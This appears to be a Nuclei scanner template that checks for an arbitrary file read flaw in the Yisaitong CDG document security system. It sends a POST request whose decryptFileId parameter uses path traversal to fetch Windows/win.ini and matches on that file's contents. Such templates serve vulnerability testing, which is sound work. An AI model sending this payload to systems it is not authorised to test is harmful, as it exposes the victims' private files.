id: yisaitongCDG-ViewDecyptFile-fileread

info:
  name: 亿赛通电子文档安全管理系统ViewDecyptFile任意文件读取漏洞
  author: yisaitongCDG
  severity: medium
  tags: fileread,yisaitong,CDG


http:
  - raw:
      - |
        POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
        Host: {{Hostname}} 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
        Content-Type: application/x-www-form-urlencoded
 
        command=ViewDecyptFile&decryptFileId=../../../Windows/win.ini&fileName=1.png

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '; for 16-bit app support'
      - type: status
        status: 
          - 200

